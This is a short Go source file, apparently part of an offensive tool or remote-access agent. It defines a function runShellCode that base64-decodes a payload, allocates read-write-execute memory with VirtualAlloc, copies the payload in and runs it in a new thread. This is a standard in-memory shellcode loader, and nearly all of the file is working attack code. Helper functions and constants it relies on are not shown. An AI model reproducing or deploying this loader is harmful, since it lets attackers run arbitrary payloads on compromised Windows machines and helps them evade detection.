package components

import (
	"reflect"
	"syscall"
	"unsafe"
)

func runShellCode(code string) string {
	shellcode := base64Decode(code)
	addr, _, _ := procVirtualAlloc.Call(0, 4096, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return "Shellcode failed..."
	}
	hdr := (*reflect.SliceHeader)(unsafe.Pointer(&shellcode))
	procRtlMoveMemory.Call(addr, hdr.Data, 4096)

	ht, _, _ := procCreateThread.Call(0, 0, addr, 0, 0, 0)
	if ht == 0 {
		return "Shellcode failed..."
	}
	_, _, _ = procWaitForSingleObject.Call(ht, syscall.INFINITE)
	if ht == 0 {
		return "Shellcode failed..."
	}
	return "Shellcode ran!"
}
